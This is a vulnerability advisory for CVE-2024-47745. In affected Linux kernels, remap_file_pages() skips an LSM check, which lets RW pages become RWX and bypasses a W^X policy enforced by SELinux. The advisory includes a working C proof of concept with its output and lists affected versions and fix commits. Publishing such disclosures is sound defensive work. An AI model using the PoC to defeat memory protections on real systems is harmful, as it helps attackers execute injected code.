# [H] mm: call the security_mmap_file() LSM hook in remap_file_pages()

## Summary
Severity: High
Advisory: CVE-2024-47745
Ecosystem: Linux
CVSS: 7.8 (CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H)
Published: 2024-10-21
Source: https://osv.dev/vulnerability/CVE-2024-47745
Type: osv

## Affected
- Linux: `Kernel` — affected >=4.0.0 <6.1.120, >=6.2.0 <6.6.54, >=6.7.0 <6.10.13, >=6.11.0 <6.11.2

## Details
In the Linux kernel, the following vulnerability has been resolved:

mm: call the security_mmap_file() LSM hook in remap_file_pages()

The remap_file_pages syscall handler calls do_mmap() directly, which
doesn't contain the LSM security check. And if the process has called
personality(READ_IMPLIES_EXEC) before and remap_file_pages() is called for
RW pages, this will actually result in remapping the pages to RWX,
bypassing a W^X policy enforced by SELinux.

So we should check prot by security_mmap_file LSM hook in the
remap_file_pages syscall handler before do_mmap() is called. Otherwise, it
potentially permits an attacker to bypass a W^X policy enforced by
SELinux.

The bypass is similar to CVE-2016-10044, which bypass the same thing via
AIO and can be found in [1].

The PoC:

$ cat > test.c

int main(void) {
	size_t pagesz = sysconf(_SC_PAGE_SIZE);
	int mfd = syscall(SYS_memfd_create, "test", 0);
	const char *buf = mmap(NULL, 4 * pagesz, PROT_READ | PROT_WRITE,
		MAP_SHARED, mfd, 0);
	unsigned int old = syscall(SYS_personality, 0xffffffff);
	syscall(SYS_personality, READ_IMPLIES_EXEC | old);
	syscall(SYS_remap_file_pages, buf, pagesz, 0, 2, 0);
	syscall(SYS_personality, old);
	// show the RWX page exists even if W^X policy is enforced
	int fd = open("/proc/self/maps", O_RDONLY);
	unsigned char buf2[1024];
	while (1) {
		int ret = read(fd, buf2, 1024);
		if (ret <= 0) break;
		write(1, buf2, ret);
	}
	close(fd);
}

$ gcc test.c -o test
$ ./test | grep rwx
7f1836c34000-7f1836c35000 rwxs 00002000 00:01 2050 /memfd:test (deleted)

[PM: subject line tweaks]

## References
- https://git.kernel.org/stable/c/0f910dbf2f2a4a7820ba4bac7b280f7108aa05b1
- https://git.kernel.org/stable/c/3393fddbfa947c8e1fdcc4509226905ffffd8b89
- https://git.kernel.org/stable/c/49d3a4ad57c57227c3b0fd6cd4188b2a5ebd6178
- https://git.kernel.org/stable/c/ce14f38d6ee9e88e37ec28427b4b93a7c33c70d3
- https://git.kernel.org/stable/c/ea7e2d5e49c05e5db1922387b09ca74aa40f46e2
- https://lists.debian.org/debian-lts-announce/2025/03/msg00001.html
- https://github.com/CVEProject/cvelistV5/tree/main/cves/2024/47xxx/CVE-2024-47745.json
- https://nvd.nist.gov/vuln/detail/CVE-2024-47745
- https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git
